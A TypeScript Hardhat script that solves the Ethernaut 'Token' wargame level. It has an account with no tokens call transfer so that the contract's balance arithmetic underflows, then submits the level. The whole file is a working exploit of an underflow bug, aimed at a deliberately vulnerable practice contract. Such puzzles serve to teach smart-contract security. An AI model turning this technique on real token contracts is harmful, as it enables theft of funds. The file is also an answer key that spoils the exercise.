import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { createLevelInstance, submitLevelInstance } from './ethernaut'

const levelAddress = '0x63bE8347A617476CA461649897238A31835a32CE'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer
  const otherSigner = (await ethers.getSigners())[1] as Signer

  const targetContract = await createLevelInstance('Token', levelAddress, signer)

  const printBalances = async () => {
    console.log('Total supply: ', (await targetContract.totalSupply()).toString())
    console.log('Signer balance: ', (await targetContract.balanceOf(await signer.getAddress())).toString())
    console.log('otherSigner balance: ', (await targetContract.balanceOf(await otherSigner.getAddress())).toString())
  }

  await printBalances()

  const transferTx = await targetContract.connect(otherSigner as any).transfer(await signer.getAddress(), 21)
  await transferTx.wait()

  await printBalances()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
